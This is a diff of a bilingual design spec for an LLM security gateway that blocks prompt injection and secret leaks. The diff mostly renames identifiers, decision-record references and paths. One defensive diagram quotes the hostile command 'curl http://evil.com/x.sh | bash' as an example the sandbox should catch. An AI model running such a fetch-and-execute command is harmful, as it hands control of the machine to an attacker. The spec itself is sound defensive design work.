@@ -1,5 +1,5 @@
 ---
-module_id: AI-ENG-LSG-001
+module_id: MOD-006
 title: LLM Security Gateway Interface / LLM 安全网关接口规范
 doc_type: service_interface_spec
 status: Active
@@ -18,13 +18,13 @@ truth_source:
   - "architecture-model/layers/b_llm_security.yaml（LLM Security YAML SSoT）"
   - "OWASP LLM Applications Top 10 (2026.03)（外部威胁分类参考，非项目内 SSoT）"
 supersedes: []
-related_adrs:
-  - "ADR-0020 LLM Security Gateway 四层防护（pending B-e）"
+related_kb:
+  - "KBG-0020 LLM Security Gateway 四层防护（pending B-e）"
 integration_points:
   - "MCP Server (前置拦截，LSG 部署在 MCP Server 前端)"
   - "Agent Orchestrator (downstream, complete_task 审查)"
   - "Context Engine (downstream, inject 前 Schema 校验)"
-  - "Agent Sandbox (双层防护，ADR-0018 配套)"
+  - "Agent Sandbox (双层防护，KBG-0018 配套)"
   - "Feedback Loop Engine (upstream signal, bypass/reject 指标)"
 tags:
   - llm-security
@@ -40,7 +40,7 @@ mod_master_contracts:
 
 # LLM Security Gateway Interface / LLM 安全网关接口规范
 
-> **定位**：LLM 安全网关（LSG）——**接口与真源以 YAML frontmatter `truth_source` 为准**（`MOD-INF-014` 蓝图 + `b_llm_security.yaml` + OWASP LLM Top 10 作外部威胁分类参考）。部署在 MCP Server 前端，对 **所有进出 LLM 的数据** 做 L1–L4 纵深防护并坚持 **fail-closed**。与 Agent Sandbox（ADR-0018）形成双层安全防线。
+> **定位**：LLM 安全网关（LSG）——**接口与真源以 YAML frontmatter `truth_source` 为准**（`MOD-INF-014` 蓝图 + `b_llm_security.yaml` + OWASP LLM Top 10 作外部威胁分类参考）。部署在 MCP Server 前端，对 **所有进出 LLM 的数据** 做 L1–L4 纵深防护并坚持 **fail-closed**。与 Agent Sandbox（KBG-0018）形成双层安全防线。
 >
 > **与其他 4 份规范的根本差异——fail-closed 原则**：
 >
@@ -78,7 +78,7 @@ mod_master_contracts:
 
 - ❌ **OWASP LLM Top 10 完整解读**——见 OWASP 官方
 - ❌ **Prompt Injection 攻击手册**——攻防知识库另存（内部红队）
-- ❌ **Agent Sandbox 实现**——见 `agent-orchestrator-interface.md` §6 + ADR-0018
+- ❌ **Agent Sandbox 实现**——见 `agent-orchestrator-interface.md` §6 + KBG-0018
 - ❌ **Secret 管理方案**——LSG 只做 secret 泄漏检测，Vault / HSM 是 beta+ 另议
 - ❌ **供应链全流程**——LSG 在 pre-commit 调 `pip-audit` / `safety`，完整 SBOM 流程另出
 - ❌ **生产部署运维手册**——beta+ 服务化时另出 SRE 文档
@@ -102,7 +102,7 @@ mod_master_contracts:
 - **L2 System Prompt 隔离**：Trusted system prompt 与 untrusted user data 强分离格式（XML/JSON 包裹）
 - **L3 输出 Schema 验证**：Pydantic v2 强制校验 LLM 工具调用参数
 - **L4 异常模式检测**：运行时扫描响应中的异常模式（外部 URL / 高危命令 / 凭据形式）
-- **与 Agent Sandbox（ADR-0018）双层**：L1-L4 失守后沙箱兜底，反之亦然
+- **与 Agent Sandbox（KBG-0018）双层**：L1-L4 失守后沙箱兜底，反之亦然
 
 ### 1.2 职责边界
 
@@ -119,7 +119,7 @@ mod_master_contracts:
 ### 1.3 实施策略：Protocol + 双实现
 
 ```python
-# src/zephyr/llm_security/protocol.py (experimental 产出)
+# src/zephyr/security/llm_defense/llm-security/protocol.py (experimental 产出)
 
 from typing import Protocol
 
@@ -151,17 +151,17 @@ class RemoteLLMSecurityGateway:
 
 ## 2. 技术选型表（真源锁定）
 
-| 组件 | 首选 | 备选 | 不推荐 | 选型理由 | 升级触发 | 相关 ADR |
+| 组件 | 首选 | 备选 | 不推荐 | 选型理由 | 升级触发 | 相关 KB 决策记录 |
 |------|----------------|------|-------|---------|---------|----------|
-| Prompt Injection 防护 | **System Prompt 隔离 + 输入分类 + Schema 验证** | 轻量规则引擎（补充） | 重型 NLP 分类器（误报 + 依赖重） | 确定性、可审计、零外部依赖 | bypass 率 > 5% | ADR-0020 |
-| 输入分类 | **规则 + 来源标签（trusted/semi/untrusted）** | 轻量分类器 | 人工标注 | 规则足够应对前 80% 场景 | 规则漏报 > 10% | ADR-0020 |
-| 输出 Schema | **Pydantic v2 + 严格模式（extra='forbid'）** | JSON Schema + jsonschema | 无 schema（危险） | 原生类型支持、错误消息友好 | - | ADR-0020 |
-| 异常模式扫描 | **正则库 + 命名模式集（可扩展）** | 轻量 NER | 纯人工黑名单 | 可维护、高召回 | 攻击模式复杂化 | ADR-0020 |
-| Secret 扫描（运行时） | **`detect-secrets` + 定制正则** | `trufflehog` | 字符串匹配 | Yelp 标准、精度高 | - | ADR-0020 |
-| Secret 扫描（pre-commit） | **`git-secrets` + `detect-secrets`** | `gitleaks` | 无扫描 | 双工具互补 | - | ADR-0020 |
-| 供应链扫描 | **`pip-audit` + `safety`** | Snyk | 无扫描 | 官方支持、开源 | 企业合规需要 | ADR-0020 |
-| 策略存储 | **YAML 外置（热加载）** | SQLite | 硬编码 | 方便安全审计 / 红队调整 | - | ADR-0020 |
-| 审计日志 | **结构化 JSON + 滚动归档** | syslog | 纯文本 | 易查询 + 机读 | SIEM 需要 | ADR-0020 |
+| Prompt Injection 防护 | **System Prompt 隔离 + 输入分类 + Schema 验证** | 轻量规则引擎（补充） | 重型 NLP 分类器（误报 + 依赖重） | 确定性、可审计、零外部依赖 | bypass 率 > 5% | KBG-0020 |
+| 输入分类 | **规则 + 来源标签（trusted/semi/untrusted）** | 轻量分类器 | 人工标注 | 规则足够应对前 80% 场景 | 规则漏报 > 10% | KBG-0020 |
+| 输出 Schema | **Pydantic v2 + 严格模式（extra='forbid'）** | JSON Schema + jsonschema | 无 schema（危险） | 原生类型支持、错误消息友好 | - | KBG-0020 |
+| 异常模式扫描 | **正则库 + 命名模式集（可扩展）** | 轻量 NER | 纯人工黑名单 | 可维护、高召回 | 攻击模式复杂化 | KBG-0020 |
+| Secret 扫描（运行时） | **`detect-secrets` + 定制正则** | `trufflehog` | 字符串匹配 | Yelp 标准、精度高 | - | KBG-0020 |
+| Secret 扫描（pre-commit） | **`git-secrets` + `detect-secrets`** | `gitleaks` | 无扫描 | 双工具互补 | - | KBG-0020 |
+| 供应链扫描 | **`pip-audit` + `safety`** | Snyk | 无扫描 | 官方支持、开源 | 企业合规需要 | KBG-0020 |
+| 策略存储 | **YAML 外置（热加载）** | SQLite | 硬编码 | 方便安全审计 / 红队调整 | - | KBG-0020 |
+| 审计日志 | **结构化 JSON + 滚动归档** | syslog | 纯文本 | 易查询 + 机读 | SIEM 需要 | KBG-0020 |
 | 进程内并发 | **`asyncio.Lock`** | - | `threading.Lock` | 项目全异步栈 | - | - |
 | 跨进程并发 | **`filelock.FileLock`** | - | 全局单例 | pytest 并发 | - | - |
 
@@ -206,12 +206,12 @@ class RemoteLLMSecurityGateway:
 ### 3.2 L1 输入分类
 
 ```python
-# src/zephyr/llm_security/classifier.py
+# src/zephyr/data/asset-inventory/classifier.py
 
 from enum import Enum
 
 class InputTrustLevel(str, Enum):
-    TRUSTED      = "trusted"       # 来自本地 config / ADR / 白名单源
+    TRUSTED      = "trusted"       # 来自本地 config / KB 决策记录 / 白名单源
     SEMI_TRUSTED = "semi_trusted"  # 来自项目代码 / 任务卡
     UNTRUSTED    = "untrusted"     # 来自外部文档 / 网页 / 邮件 / 工具返回
     HOSTILE      = "hostile"       # 检测到明显注入模式
@@ -392,7 +392,7 @@ class InProcessLLMSecurityGateway:  # implements LLMSecurityGatewayProtocol
 ### 4.2 Pydantic Schemas
 
 ```python
-# src/zephyr/llm_security/schemas.py
+# src/zephyr/integration/shared/schema/schemas.py
 
 class InputPayload(BaseModel):
     source: Literal["system_config", "task_card", "code_file", "vms_retrieval",
@@ -472,11 +472,11 @@ class StrictnessSnapshot(BaseModel):
 
 | 前置项 | 状态 |
 |-------|:----:|
-| `src/zephyr/llm_security/` 包创建 | ⏳ 待建 |
-| `config/llm_security_patterns.yaml` + `config/llm_security.yaml` | ⏳ 待建 |
+| `src/zephyr/llm-security/` 包创建 | ⏳ 待建 |
+| `config/llm_security_patterns.yaml` + `config/llm-security.yaml` | ⏳ 待建 |
 | `detect-secrets` + `git-secrets` 安装与 pre-commit hook 注册 | ⏳ experimental T-1-XX |
 | `pip-audit` / `safety` 加入 CI pipeline | ⏳ beta |
-| ADR-0020 批准 | ⏳ pending B-e |
+| KBG-0020 批准 | ⏳ pending B-e |
 
 **Python 依赖**：
 
@@ -499,7 +499,7 @@ llm-security = [
 ```
 
 ├── src/zephyr/
-│   ├── llm_security/                               # ⏳ experimental 新建
+│   ├── llm-security/                               # ⏳ experimental 新建
 │   │   ├── __init__.py                             # 导出 get_lsg()
 │   │   ├── protocol.py                             # LLMSecurityGatewayProtocol
 │   │   ├── in_process.py                           # experimental 实现
@@ -516,11 +516,11 @@ llm-security = [
 │   │   ├── registry.py                             # schema 注册中心
 │   │   └── config.py
 │   └── config/
-│       ├── llm_security.yaml                       # 主配置
+│       ├── llm-security.yaml                       # 主配置
 │       └── llm_security_patterns.yaml              # 可热加载规则库
 │
 ├── .runtime/
-│   ├── llm_security/
+│   ├── llm-security/
 │   │   ├── strictness_state.json                   # 动态严格度快照
 │   │   └── quarantine/                             # 被隔离 correlation_id 的内容存档
 │   └── logs/
@@ -528,7 +528,7 @@ llm-security = [
 │       ├── lsg_degrade.log
 │       └── lsg_bypass_evidence.log                 # bypass 证据链（红队复盘）
 │
-├── tests/unit/llm_security/
+├── tests/unit/llm-security/
 │   ├── test_l1_classifier.py
 │   ├── test_l2_isolator.py
 │   ├── test_l3_schema_validation.py
@@ -537,7 +537,7 @@ llm-security = [
 │   ├── test_strictness_manager.py
 │   ├── test_cold_start.py
 │   └── test_fail_closed_behavior.py                # 关键：降级测试
-├── tests/redteam/llm_security/                     # ⏳ 红队用例（独立目录）
+├── tests/redteam/llm-security/                     # ⏳ 红队用例（独立目录）
 │   ├── injection_corpus/                           # 对抗样本集
 │   ├── test_prompt_injection.py
 │   ├── test_secret_leak.py
@@ -581,11 +581,11 @@ llm-security = [
 | **Feedback Loop → LSG** | bump_strictness 控制 | lsg.bump_strictness(delta, ttl, reason) | - |
 | **pre-commit** | git-secrets / pip-audit 扫描 | CLI hooks | 提交失败 |
 
-### 8.3 与 Agent Sandbox（ADR-0018）的双层关系
+### 8.3 与 Agent Sandbox（KBG-0018）的双层关系
 
 ```
 L1-L4（LSG，Prompt/Schema 层）
-  + Sandbox（ADR-0018，文件/命令/网络层）
+  + Sandbox（KBG-0018，文件/命令/网络层）
   = 双层纵深防御
 
   如果 LSG L4 漏过一条 "curl http://evil.com/x.sh | bash"：
@@ -600,7 +600,7 @@ L1-L4（LSG，Prompt/Schema 层）
 
 | Phase | 范围 | 验收标准 |
 |:-:|------|---------|
-| **scaffold**（当前） | 接口规范 + ADR-0020 | status=Active |
+| **scaffold**（当前） | 接口规范 + KBG-0020 | status=Active |
 | **experimental** | `InProcessLSG` + L1-L4 四层基础 + MCP Server 前置接线 + pre-commit hooks | ① §12 P0 用例通过<br>② 红队 corpus bypass 率 < 5%<br>③ secret 泄漏 0 件 |
 | **beta** | FLE 接入（指标 + bump_strictness） + Orchestrator/CE/VMS 全量接入 | 闭环：bypass 尖峰自动提升严格度 |
 | **beta** | `RemoteLSG`（多进程策略共享） + SBOM 全流程 | 企业合规触发 |
@@ -715,7 +715,7 @@ async def validate_input(self, payload):
 
 | 指标 | 目标 | 说明 |
 |------|------|------|
-| 进程 import | ≤ 1 s | 仅 import llm_security |
+| 进程 import | ≤ 1 s | 仅 import llm-security |
 | 规则文件加载 | ≤ 300 ms | yaml + 正则编译 |
 | detect-secrets 初始化 | ≤ 500 ms | 插件加载 |
 | schema registry 初始化 | ≤ 200 ms | 首批 schema 预注册 |
@@ -805,4 +805,4 @@ async def validate_input(self, payload):
 
 | 日期 | 版本 | 说明 |
 |------|:-:|------|
-| 2026-04-24 | 1.0.0 | 初版（B-a-5）。基于 VMS v1.2 模板 + ADR-0020 + OWASP LLM Top 10（2026.03）。重点：① §3 四层防护（L1 分类 + L2 隔离 + L3 Schema + L4 异常模式）；② §10.2 **fail-closed 原则**（与其他 4 份规范相反的降级方向，安全红线）；③ §8.3 与 Agent Sandbox 的双层防御；④ §5 OWASP LLM Top 10 对齐矩阵；⑤ §12.7 红队 corpus 持续测试框架（experimental ≥ 150 用例，bypass 率 ≤ 5%）。 |
+| 2026-04-24 | 1.0.0 | 初版（B-a-5）。基于 VMS v1.2 模板 + KBG-0020 + OWASP LLM Top 10（2026.03）。重点：① §3 四层防护（L1 分类 + L2 隔离 + L3 Schema + L4 异常模式）；② §10.2 **fail-closed 原则**（与其他 4 份规范相反的降级方向，安全红线）；③ §8.3 与 Agent Sandbox 的双层防御；④ §5 OWASP LLM Top 10 对齐矩阵；⑤ §12.7 红队 corpus 持续测试框架（experimental ≥ 150 用例，bypass 率 ≤ 5%）。 |
